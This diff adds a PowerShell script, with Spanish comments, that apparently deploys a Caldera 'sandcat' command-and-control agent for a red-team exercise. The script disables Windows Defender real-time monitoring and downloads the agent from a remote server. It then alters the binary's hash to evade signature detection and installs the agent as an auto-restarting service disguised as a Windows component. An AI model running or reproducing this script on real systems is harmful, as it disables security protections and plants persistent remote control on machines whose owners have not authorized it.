@@ -1,0 +1,36 @@
+# Ejecutar como Administrador
+$ErrorActionPreference = "Stop"
+
+# Ruta segura para el agente
+$folder = "C:\ProgramData\WindowsHelper"
+$exe = "$folder\winhost.exe"
+$server = "http://10.111.8.251:8888"
+
+# 1. Desactiva Defender en tiempo real
+Write-Host "[*] Desactivando protección en tiempo real de Defender..."
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# 2. Crea la carpeta segura
+Write-Host "[*] Creando carpeta: $folder"
+New-Item -ItemType Directory -Path $folder -Force | Out-Null
+
+# 3. Descarga el agente
+Write-Host "[*] Descargando agente desde $server..."
+Invoke-WebRequest -Uri "$server/file/download" `
+  -Headers @{platform="windows"; file="sandcat.go"} `
+  -OutFile $exe
+
+# 4. Modifica el hash (anti-firma simple)
+Write-Host "[*] Añadiendo bytes dummy para alterar hash..."
+Add-Content $exe -Value "`nREM DUMMYDATA123456"
+
+# 5. Crea servicio persistente
+Write-Host "[*] Registrando servicio persistente..."
+cmd /c "sc create WinHostAgent binPath= `"$exe -server $server -group red`" start= auto"
+cmd /c "sc failure WinHostAgent reset= 0 actions= restart/5000"
+
+# 6. Reactiva Defender si quieres (opcional)
+Write-Host "[*] Reactivando Defender..."
+Set-MpPreference -DisableRealtimeMonitoring $false
+
+Write-Host "`n[✓] Agente instalado como servicio. Verifica con: sc query WinHostAgent" -ForegroundColor Green
